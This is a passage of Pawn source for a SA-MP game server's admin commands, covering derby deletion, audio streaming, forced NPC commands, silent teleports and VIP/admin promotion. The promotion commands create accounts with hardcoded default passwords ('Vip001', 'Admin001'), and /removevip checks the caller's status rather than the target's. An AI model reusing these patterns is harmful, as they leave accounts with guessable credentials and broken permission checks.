    new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || strval(tmps2) < 1 || strval(tmps2) > MAX_DERBIES)
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /delderby <DerbyID[1-100]>");

	new derbyidstr[20];
	format(derbyidstr, sizeof(derbyidstr), "D%d", strval(tmps2));
	if (!djIsSet(DERBYFILE, derbyidstr))
	return SendErrorMessage(playerid, EMBED_WHITE, "There is no derby map saved in this slot");
 	new derbyid = strval(tmps2);

	GetPlayerName(playerid, playername, sizeof(playername));
	format(derbystr, sizeof(derbystr), "D%d/Comment", derbyid);
	format(strings, sizeof(strings), "Admin %s has deleted derby \"%s\" [DerbyID: %d]", playername, dj(DERBYFILE, derbystr), derbyid);

	format(derbystr, sizeof(derbystr), "D%d", derbyid);
	djUnset(DERBYFILE, derbystr);
	SendServerMessageToAll(EMBED_WHITE, strings);
	SendCommandMessageToAdmins(playerid, "delderby");
	return 1;
}

dcmd_play(playerid,params[])
{
	new radiourl[115];
	if (sscanf(params, "s[115] ", radiourl))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /play <http:url|stop> [SA-MP]");

	if (!strcmp(radiourl, "stop", true) || !strcmp(radiourl, "off", true))
	{
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
			if (IsPlayerConnected(i))
			StopAudioStreamForPlayer(i);
		}
	} else {
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
			if (IsPlayerConnected(i) && player[i][radio] == 1)
			PlayAudioStreamForPlayer(i, radiourl);
		}
	}
	SendCommandMessageToAdmins(playerid, "play");
	return 1;
}

dcmd_play2(playerid,params[])
{
	new radiourl[115];
	if (sscanf(params, "s[115] ", radiourl))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /play2 <http:url|stop> [SA-MP - forcing everyone to play]");

	if (!strcmp(radiourl, "stop", true) || !strcmp(radiourl, "off", true))
	{
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
			if (IsPlayerConnected(i))
			StopAudioStreamForPlayer(i);
		}
	} else {
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
			if (IsPlayerConnected(i))
			PlayAudioStreamForPlayer(i, radiourl);
		}
	}
	SendCommandMessageToAdmins(playerid, "play2");
	return 1;
}

dcmd_play3(playerid,params[])
{
	new radiourl[115];
	if (sscanf(params, "s[115] ", radiourl))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /play <audioID/http:url|off|pause|resume> [xAudio]");

	if (!strcmp(radiourl, "stop", true) || !strcmp(radiourl, "off", true))
	{
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
			if (IsPlayerConnected(i) && Audio_IsClientConnected(i) && player[i][HANDLEID_GLOBAL] != -1)
			{
				Audio_Stop(i, player[i][HANDLEID_GLOBAL]);
				player[i][HANDLEID_GLOBAL] = -1;
			}
		}
	} else if (!strcmp(radiourl, "pause", true))
	{
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
			if (IsPlayerConnected(i) && Audio_IsClientConnected(i) && player[i][HANDLEID_GLOBAL] != -1)
			Audio_Pause(i, player[i][HANDLEID_GLOBAL]);
		}
	} else if (!strcmp(radiourl, "resume", true))
	{
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
			if (IsPlayerConnected(i) && Audio_IsClientConnected(i) && player[i][HANDLEID_GLOBAL] != -1)
			Audio_Resume(i, player[i][HANDLEID_GLOBAL]);
		}
	} else {
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
			if (IsPlayerConnected(i) && Audio_IsClientConnected(i) && player[i][HANDLEID_GLOBAL] != -1)
			{
				Audio_Stop(i, player[i][HANDLEID_GLOBAL]);
				player[i][HANDLEID_GLOBAL] = -1;
			}
		}

		if (IsNumeric(params))
		{
			for (new i = 0; i < MAX_PLAYERS; i++)
			{
				if (IsPlayerConnected(i) && Audio_IsClientConnected(i))
				player[i][HANDLEID_GLOBAL] = Audio_Play(i, strval(params));
			}
		} else {
			for (new i = 0; i < MAX_PLAYERS; i++)
			{
				if (IsPlayerConnected(i) && Audio_IsClientConnected(i))
				player[i][HANDLEID_GLOBAL] = Audio_PlayStreamed(i, params);
			}
		}
	}
	SendCommandMessageToAdmins(playerid, "play3");
	return 1;
}

dcmd_forcedeath(playerid,params[])
{
    new idx,
		giveplayerid2,
		reason;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forcedeath <killer> <victim> <reason(0-46)>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forcedeath <killer> <victim> <reason(0-46)>");

	if (!IsNumeric(tmps2)) giveplayerid2 = ReturnPlayerID(tmps2);
	else giveplayerid2 = strval(tmps2);

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2) || strval(tmps2) < 0 || strval(tmps2) > 46)
	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forcedeath <killer> <victim> <reason(0-46)>");
	reason = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && IsPlayerConnected(giveplayerid2))
	{
	    //CallRemoteFunction("OnPlayerDeath", "iii", giveplayerid2, giveplayerid, reason);
	    SendDeathMessage(giveplayerid2, giveplayerid, reason);
		SendCommandMessageToAdmins(playerid, "forcedeath");
		//player[giveplayerid2][spawned] = 1;
		//player[giveplayerid2][specdm] = 0;
	} else SendErrorMessage(playerid, EMBED_WHITE, "One of the players is not connected.");
	return 1;
}

dcmd_earthquake(playerid,params[])
{
	#pragma unused params

	if (earthquaketimer1 == -1)
	{
	    earthquaketimer1 = SetTimer("earthquake", 101, 1);
	    earthquaketimer2 = SetTimer("earthquake2", 200, 1);
	} else {
		KillTimer(earthquaketimer1);
		KillTimer(earthquaketimer2);
	    earthquaketimer1 = -1;
	    earthquaketimer2 = -1;

		for (new i = 0; i < MAX_PLAYERS; i++)
		{
			if (IsPlayerConnected(i))
			SetPlayerDrunkLevel(i, 0);
		}
	}
	SendCommandMessageToAdmins(playerid, "earthquake");
	return 1;
}

/*dcmd_setwarzone(playerid,params[])
{
	new lcommand[9],
	    parameter[7];

	if (sscanf(params, "s[9] ", lcommand))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setwarzone <settings/add (base|vehicle->");

	SendCommandMessageToAdmins(playerid, "setwarzone");
	if (!strcmp(lcommand, "settings", true))
    {
		if (!sscanf(params, "{s[9]}s[10] ", parameter))
		{
		    if (!strcmp(parameter, "attackers", true))
		    {
		        new parameter2[7];
		   		if (!sscanf(params, "{s[9]s[10]}s[7] ", parameter2))
				{
				    if (!strcmp(parameter2, "skin", true))
				    {
				        new skinID;
				   		if (!sscanf(params, "{s[9]s[10]s[7]}d", skinID))
						{
							if (skinID < 0 || skinID > 299 || skinID == 74)
							return SendErrorMessage(playerid, EMBED_WHITE, "This skinID is not valid");

							//SetPlayerSkin(playerid, skinID);
							return 1;
						}
				    } else if (!strcmp(parameter2, "colour", true))
				    {
				        new cR, cG, cB, cA;
				   		if (!sscanf(params, "{s[9]s[10]s[7]}dddd", cR, cG, cB, cA))
						{
							//SetPlayerColor(playerid, MAKE_COLOUR_ALPHA(cR, cG, cB, cA));
							return 1;
						}
				    }
				}
		    } else if (!strcmp(parameter, "defenders", true))
		    {
		        new parameter2[7];
		   		if (!sscanf(params, "{s[9]s[10]}s[7] ", parameter2))
				{
				    if (!strcmp(parameter2, "skin", true))
				    {
				        new skinID;
				   		if (!sscanf(params, "{s[9]s[10]s[7]}d", skinID))
						{
							if (skinID < 0 || skinID > 299 || skinID == 74)
							return SendErrorMessage(playerid, EMBED_WHITE, "This skinID is not valid");

							//SetPlayerSkin(playerid, skinID);
							return 1;
						}
				    } else if (!strcmp(parameter2, "colour", true))
				    {
				        new cR, cG, cB, cA;
				   		if (!sscanf(params, "{s[9]s[10]s[7]}dddd ", cR, cG, cB, cA))
						{
							//SetPlayerColor(playerid, MAKE_COLOUR_ALPHA(cR, cG, cB, cA));
							return 1;
						}
				    }
				}
		    }
		}
		return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setwarzone settings <attackers/defenders> <skin/colour> <skinID/R G B A>");
	} else if (!strcmp(lcommand, "add", true))
	{
   		if (!sscanf(params, "{s[9]}s[10] ", parameter))
		{
			if (!strcmp(parameter, "base", true))
		    {
				new parameter2[9];
		   		if (!sscanf(params, "{s[9]s[10]}s[9] ", parameter2))
				{
				    if (!strcmp(parameter2, "name", true))
				    {
				        new basename[55];
				   		if (!sscanf(params, "{s[9]s[10]s[9]}s[55]", basename))
						{
							if (strlen(basename) < 5 || strlen(basename) > 50)
							return SendErrorMessage(playerid, EMBED_WHITE, "Minimum 5 - maximum 50 characters for base names.");

							//update base name
							return 1;
						}
					} else if (!strcmp(parameter2, "attacker", true))
				    {
						//set spawn
						return 1;
				    } else if (!strcmp(parameter2, "defender", true))
				    {
						//set spawn
						return 1;
				    } else if (!strcmp(parameter2, "mode", true))
				    {
				        new basemode = 0;
				   		if (!sscanf(params, "{s[9]s[10]s[9]}d ", basemode))
						{
							if (1 >= basemode >= 0)
							{
							    //set mode
								return 1;
							} else return SendErrorMessage(playerid, EMBED_WHITE, "This mode is not valid (0: ground vehicles - 1: parachute drop");
						}
					}
				}
				return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setwarzone add base <name/attacker/defender/mode>");
			} else if (!strcmp(parameter, "vehicle", true))
		    {
		        new baseID;
		   		if (!sscanf(params, "{s[9]s[10]s[9]}d ", baseID))
				{
					if (IsPlayerInAnyVehicle(playerid))
					{

					//save stuff - check first if base exists
					//TogglePlayerControllable(playerid, 0);
					} else return SendErrorMessage(playerid, EMBED_WHITE, "You must be inside a vehicle.");
				}
				return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setwarzone add vehicle <baseID>");
			}
		}
		return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setwarzone add <base/vehicle>");
	} else if (!strcmp(lcommand, "del", true))
	{
   		if (!sscanf(params, "{s[9]}s[10] ", parameter))
		{
			if (!strcmp(parameter, "base", true))
		    {
				new parameter2[9];
		   		if (!sscanf(params, "{s[9]s[10]}s[9] ", parameter2))
				{

					// check & delete
				}
				return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setwarzone del base <baseID>");
			} else if (!strcmp(parameter, "vehicle", true))
		    {
		        new baseID, vehicleID;
		   		if (!sscanf(params, "{s[9]s[10]s[9]}dd ", baseID, vehicleID))
				{
					//delete - check first by returning all vehicles linked to this base and pick the e.g. third of it (vehicleid)
				}
				return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setwarzone del vehicle <baseID> <vehicleID>");
			}
		}
		return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setwarzone del <base/vehicle>");
	} else SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /setwarzone <settings/add/del>");
	return 1;
}*/

dcmd_forcecmdb(playerid,params[])
{
	new cname[24];
	GetPlayerName(playerid, cname, sizeof(cname));
	if (!IsPlayerAdminLevel(playerid, 5))
	return 1;

    new idx;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forcecmdb <name|id/all> <command>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (!strlen(params[strlen(tmps2)+1]))
	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forcecmdb <name|id/all> <command>");

	if (!strcmp(tmps2, "all", true))
	{
 		if (!strlen(params[strlen(tmps2)+1]))
	    return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forcecmdb <name|id/all> <command>");

	    format(strings, sizeof(strings), "/%s",params[strlen(tmps2)+1]);
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
		    if (IsPlayerConnected(i) && IsPlayerNPC(i))
	    	CallRemoteFunction("OnPlayerCommandText", "is", i, strings);
		}
		SendCommandMessageToAdmins(playerid, "forcecmdb", 4);
		return 1;
	}

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
 		if (giveplayerid == playerid)
	    return SendErrorMessage(playerid, EMBED_WHITE, "You can't force yourself");

		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN] || !IsPlayerNPC(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

        if (strfind(params[strlen(tmps2)+1], "setpass", true) != -1 || strfind(params[strlen(tmps2)+1], "warn", true) != -1 || strfind(params[strlen(tmps2)+1], "kick", true) != -1 || strfind(params[strlen(tmps2)+1], "ban", true) != -1  || strfind(params[strlen(tmps2)+1], "ostick", true) != -1  || strfind(params[strlen(tmps2)+1], "postick", true) != -1)
        return SendErrorMessage(playerid, EMBED_WHITE, "This command is blocked in forcecmd");

	    format(strings, sizeof(strings), "/%s",params[strlen(tmps2)+1]);
	    CallRemoteFunction("OnPlayerCommandText", "is", giveplayerid, strings);
		SendCommandMessageToAdmins(playerid, "forcecmdb", 4);
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_forceanimb(playerid,params[])
{
	new cname[24];
	GetPlayerName(playerid, cname, sizeof(cname));
	if (!IsPlayerAdminLevel(playerid, 5))
	return 1;

    new idx;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forceanimb <name|id/all> <anim cmd from /ahelp>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (!strlen(params[strlen(tmps2)+1]))
	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forceanimb <name|id/all> <anim cmd from /ahelp>");

	if (!strcmp(tmps2, "all", true))
	{
 		if (!strlen(params[strlen(tmps2)+1]))
	    return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forceanimb <name|id/all> <anim cmd from /ahelp>");

 		format(strings, sizeof(strings), "/%s",params[strlen(tmps2)+1]);
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
		    if (IsPlayerConnected(i) && IsPlayerNPC(i))
		    CallRemoteFunction("ApplyAnimationForPlayer", "is", i, strings);
		}
		SendCommandMessageToAdmins(playerid, "forceanimb", 4);
		return 1;
	}

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
 		if (giveplayerid == playerid)
	    return SendErrorMessage(playerid, EMBED_WHITE, "You can't force yourself");

		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN] || !IsPlayerNPC(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

	    format(strings, sizeof(strings), "/%s",params[strlen(tmps2)+1]);
	    CallRemoteFunction("ApplyAnimationForPlayer", "is", giveplayerid, strings);
		SendCommandMessageToAdmins(playerid, "forceanimb", 4);
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_forcesanimb(playerid,params[])
{
	new cname[24];
	GetPlayerName(playerid, cname, sizeof(cname));
	if (!IsPlayerAdminLevel(playerid, 5))
	return 1;

    new idx;

	tmps2 = strtok(params, idx);
 	if (!strlen(tmps2))
 	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forcesanimb <name|id/all> <anim cmd from /sahelp>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (!strlen(params[strlen(tmps2)+1]))
	return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forcesanimb <name|id/all> <anim cmd from /sahelp>");

	if (!strcmp(tmps2, "all", true))
	{
 		if (!strlen(params[strlen(tmps2)+1]))
	    return SendClientMessage(playerid, COLOR_DARKRED, "[USAGE]: /forcesanimb <name|id/all> <anim cmd from /sahelp>");

 		format(strings, sizeof(strings), "/%s",params[strlen(tmps2)+1]);
		for (new i = 0; i < MAX_PLAYERS; i++)
		{
		    if (IsPlayerConnected(i) && IsPlayerNPC(i))
		    CallRemoteFunction("ApplyAnimationForPlayer2", "is", i, strings);
		}
		SendCommandMessageToAdmins(playerid, "forcesanimb");
		return 1;
	}

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
 		if (giveplayerid == playerid)
	    return SendErrorMessage(playerid, EMBED_WHITE, "You can't force yourself");

		if (player[playerid][ADMIN] < player[giveplayerid][ADMIN] || !IsPlayerNPC(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player has higher priveleges than you. Action cancelled.");

	    format(strings, sizeof(strings), "/%s",params[strlen(tmps2)+1]);
	    CallRemoteFunction("ApplyAnimationForPlayer2", "is", giveplayerid, strings);
		SendCommandMessageToAdmins(playerid, "forcesanimb");
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_flash(playerid,params[])
{
	#pragma unused params

	if (screen == false) screen = true;
	else {
		screen = false;
		if (screen2 == true)
		{
	 		TextDrawHideForAll(screentd);
	 		screen2 = false;
		}
	}
	SendCommandMessageToAdmins(playerid, "flash");
	return 1;
}

dcmd_sgoto(playerid, params[]) // Simon
{
	new idx,
		Float:X,
	 	Float:Y,
	 	Float:Z,
	 	Float:A,
		Interior;

	strings = strtok(params, idx);
	if (!strlen(strings))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /sgoto <name|id> (X_OFFSET Y_OFFSET Z_OFFSET)");

	if (!IsNumeric(strings)) giveplayerid = ReturnPlayerID(strings);
	else giveplayerid = strval(strings);

	if (!IsPlayerConnected(giveplayerid) || giveplayerid == INVALID_PLAYER_ID)
	return SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");

	if (!IsPlayerSpawned(giveplayerid))
	return SendErrorMessage(playerid, EMBED_WHITE, "This player didn't spawn yet.");

	if (player[giveplayerid][playingdm] == 1 || player[giveplayerid][playingderby] == 1 || player[giveplayerid][playingrr] == 1 || player[giveplayerid][playingcc] == 1 || player[giveplayerid][playingnb] == 1 || player[giveplayerid][playingwarzone] == 1)
	SendClientMessage(playerid, COLOR_WHITE, "[INFO]: This player is currently in a deathmatch.");

	if (player[giveplayerid][specdm] == 1)
	return SendErrorMessage(playerid, EMBED_WHITE, "This player is currently spectating a dm");

	if (player[giveplayerid][Spectating] == 1)
	if (!IsAdmin(playerid) && IsAdmin(giveplayerid)) return 1;
	else return SendErrorMessage(playerid, EMBED_WHITE, "This player is currently spectating");

	if (giveplayerid == playerid) goto next;
	if (player[giveplayerid][gotomode] == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "[INFO]: This player has goto off");
	}
	next:

	GetPlayerPos(giveplayerid, X, Y, Z);
	GetPlayerFacingAngle(giveplayerid, A);
	Interior = GetPlayerInterior(giveplayerid);
	strings = strtok(params, idx);
	if (!strlen(strings))
	{
	    GetXYInFrontOfPlayer(giveplayerid, X, Y, 1.5);
	    SetPlayerPosEx(playerid, X, Y, Z, A, Interior);

	    GetPlayerName(giveplayerid, tmps2, sizeof(tmps2));
		format(strings, sizeof(strings), "[SUCCESS]: You have silently teleported to %s (ID: %d).", tmps2, giveplayerid);
		SendClientMessage(playerid, COLOR_IVORY, strings);
		SendCommandMessageToAdmins(playerid, "sgoto", 4);
	    return 1;
	}

	X += floatstr(strings);
	strings = strtok(params, idx);

	if (!strlen(strings)) {
	    goto fwarpto;
	}

	Y += floatstr(strings);
	strings = strtok(params, idx);

	if (!strlen(strings)) {
	    goto fwarpto;
	}

	Z += floatstr(strings);

	fwarpto:

	SetPlayerPosEx(playerid, X, Y, Z, A, Interior);

	GetPlayerName(giveplayerid, tmps2, sizeof(tmps2));
	format(strings, sizeof(strings), "[SUCCESS]: You have silently teleported to %s (ID: %d).", tmps2, giveplayerid);
	SendClientMessage(playerid, COLOR_IVORY, strings);
	//SendCommandMessageToAdmins(playerid, "sgoto", 4);
	return 1;
}

dcmd_setvip(playerid,params[])
{
	if (!strlen(params))
	return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /setvip <name|id>");

	if (!IsNumeric(params)) giveplayerid = ReturnPlayerID(params);
	else giveplayerid = strval(params);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
		if (!IsVIP(giveplayerid))
		{
			if (!IsPlayerRegistered(giveplayerid))
			{
			    new password[129];

			    WP_Hash(password, sizeof(password), "Vip001");
				CreatePlayerAccount(giveplayerid, "Vip001", password);
	   			ShowPlayerDialog(giveplayerid, DIALOGID_SETPASS, DIALOG_STYLE_INPUT, "Success", "You have been promoted to VIP (Type '/help v' for all VIP cmds)\nPlease set a password for your account below:\n[Password length must be between 5-20 characters]", "Set", "");
			} else ShowPlayerDialog(giveplayerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, "Success", "You have been promoted to VIP (Type '/help v' for all VIP cmds)", "OK", "");

			player[giveplayerid][logged] = 1;
		    player[giveplayerid][VIP] = 1;

			new mysqlStr[94];
			format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_ACCOUNTS" SET `account_vip` = %d WHERE account_id = %d LIMIT 1", player[giveplayerid][VIP], GetPlayerAccountID(giveplayerid));
			mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

			GetPlayerName(playerid, playername, sizeof(playername));
			format(logstring, sizeof(logstring), "Admin %s promoted %s (id: %d) to VIP.", playername, giveplayername, giveplayerid);
			SendMessageToAdmins(COLOR_LIGHTBLUE, logstring, 1);
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, logstring);
			printflog("ADD-VIP", logstring);
			SendClientMessage(giveplayerid, COLOR_WHITE, "You have been promoted to VIP, set your password with /setpass PASSWORD (Type '/help v' for all VIP cmds)");
			format(tmps2, sizeof(tmps2), "7,10%s", logstring);
			IRC_GroupSay(1, IRCOP_CHANNEL, tmps2);
   			SendCommandMessageToAdmins(playerid, "setvip", 4);
		} else {
			format(strings, sizeof(strings), "%s is already a VIP.", giveplayername);
			SendErrorMessage(playerid, EMBED_WHITE, strings);
		}
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_removevip(playerid,params[])
{
	if (!strlen(params))
	return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /removevip <name|id>");

	if (!IsNumeric(params)) giveplayerid = ReturnPlayerID(params);
	else giveplayerid = strval(params);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
		if (IsVIP(playerid))
		{
			if (IsAdmin(giveplayerid))
			{
				format(strings, sizeof(strings), "%s has admin rights, use /removeadmin (includes VIP removal)", giveplayername);
				SendErrorMessage(playerid, EMBED_WHITE, strings);
				return 1;
			}

			player[giveplayerid][VIP] = 0;

			new mysqlStr[92];
			format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_ACCOUNTS" SET `account_vip` = 0 WHERE account_id = %d LIMIT 1", GetPlayerAccountID(giveplayerid));
			mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

			GetPlayerName(playerid, playername, sizeof(playername));
			format(logstring, sizeof(logstring), "Admin %s removed %s's (id: %d) VIP rights.", playername, giveplayername, giveplayerid);
			SendMessageToAdmins(COLOR_LIGHTBLUE, logstring, 1);
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, logstring);
			printflog("DEL-VIP", logstring);
			format(tmps2, sizeof(tmps2), "7,10%s", logstring);
			IRC_GroupSay(1, IRCOP_CHANNEL, tmps2);
			SendCommandMessageToAdmins(playerid, "removevip", 4);
		} else {
			format(strings, sizeof(strings), "%s is not a VIP", giveplayername);
			SendErrorMessage(playerid, EMBED_WHITE, strings);
		}
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_setadmin(playerid,params[])
{
    new idx,
		level;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /setadmin <name|id> <level>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || !IsNumeric(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /setadmin <name|id> <level>");
	level = strval(tmps2);

	if (IsPlayerAdminLevel(playerid, 6))
	{
		if (level <= 0 || level > 5)
		return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /setadmin <name|id> <level[1-5]>");
	} else {
		if (level <= 0 || level > 4)
		return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /setadmin <name|id> <level[1-4]>");
	}

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (!IsPlayerSpawned(giveplayerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "This player must spawn first");

		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));

		if (!IsAdmin(giveplayerid))
		{
			if (!IsPlayerRegistered(giveplayerid))
			{
			    new password[129];

			    WP_Hash(password, sizeof(password), "Admin001");
				CreatePlayerAccount(giveplayerid, "Admin001", password);
	   			ShowPlayerDialog(giveplayerid, DIALOGID_SETPASS, DIALOG_STYLE_INPUT, "Success", "You have been promoted to admin (Type '/help admin' for all ADMIN cmds)\nPlease set a password for your account below:\n[Password length must be between 5-20 characters]", "Set", "");
			} else ShowPlayerDialog(giveplayerid, DIALOGID_UNKNOWN, DIALOG_STYLE_MSGBOX, "Success", "You have been promoted to admin (Type '/help admin' for all ADMIN cmds)", "OK", "");

			player[giveplayerid][logged] = 1;
    		player[giveplayerid][VIP] = 1;
		    player[giveplayerid][ADMIN] = level;
		    player[giveplayerid][adminmsgs] = 1;

			new mysqlStr[117];
			format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_ACCOUNTS" SET `account_vip` = %d, `account_admin` = %d WHERE account_id = %d LIMIT 1", player[giveplayerid][VIP], player[giveplayerid][ADMIN], GetPlayerAccountID(giveplayerid));
			mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

			GetPlayerName(playerid, playername, sizeof(playername));
			format(logstring, sizeof(logstring), "Admin %s has promoted %s (id: %d) to admin level %d.", playername, giveplayername, giveplayerid, player[giveplayerid][ADMIN]);
			SendMessageToAdmins(COLOR_LIGHTBLUE, logstring, 1);
			printflog("ADD-ADMIN", logstring);
			SendClientMessage(giveplayerid,COLOR_WHITE, "You have been promoted to admin, set your password with /setpass PASSWORD (Type '/help admin' for all ADMIN cmds)");
			format(tmps2, sizeof(tmps2), "7,10%s", logstring);
			IRC_GroupSay(1, IRCOP_CHANNEL, tmps2);
   			SendCommandMessageToAdmins(playerid, "setadmin", 4);
		} else {
			format(strings, sizeof(strings), "%s is already an ADMIN(+VIP).", giveplayername);
			SendErrorMessage(playerid, EMBED_WHITE, strings);
		}
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_removeadmin(playerid,params[])
{
	new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /removeadmin <name|id>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
		if (IsAdmin(giveplayerid))
		{
		    player[giveplayerid][VIP] = 0;
	 	    player[giveplayerid][ADMIN] = 0;
	 	    player[giveplayerid][hideadmin] = 0;
			player[giveplayerid][adminmsgs] = 0;

			new mysqlStr[211];
			format(mysqlStr, sizeof(mysqlStr), "UPDATE accounts, preferences SET accounts.account_admin = 0, accounts.account_vip = 0, preferences.preference_hide = 0 WHERE accounts.account_id = %d AND preferences.account_id = %d", GetPlayerAccountID(giveplayerid), GetPlayerAccountID(giveplayerid));
			mysql_run_query(mysqlConnection, mysqlStr, false, "", "");

			GetPlayerName(playerid, playername, sizeof(playername));
			format(logstring, sizeof(logstring), "Admin %s has removed %s's (id: %d) admin rights.", playername, giveplayername, giveplayerid);
			SendMessageToAdmins(COLOR_LIGHTBLUE, logstring, 1);
			printflog("DEL-ADMIN", logstring);
			format(tmps2, sizeof(tmps2), "7,10%s", logstring);
			IRC_GroupSay(1, IRCOP_CHANNEL, tmps2);
			SendCommandMessageToAdmins(playerid, "removeadmin", 4);
		} else {
			format(strings, sizeof(strings), "%s is not an ADMIN", giveplayername);
			SendErrorMessage(playerid, EMBED_WHITE, strings);
		}
	} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
	return 1;
}

dcmd_setlevel(playerid,params[])
{
	new idx,
		level;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /setlevel <name|id> <level>");

	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || !IsNumeric(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /setlevel <name|id> <level>");
	level = strval(tmps2);

	if (giveplayerid == playerid)
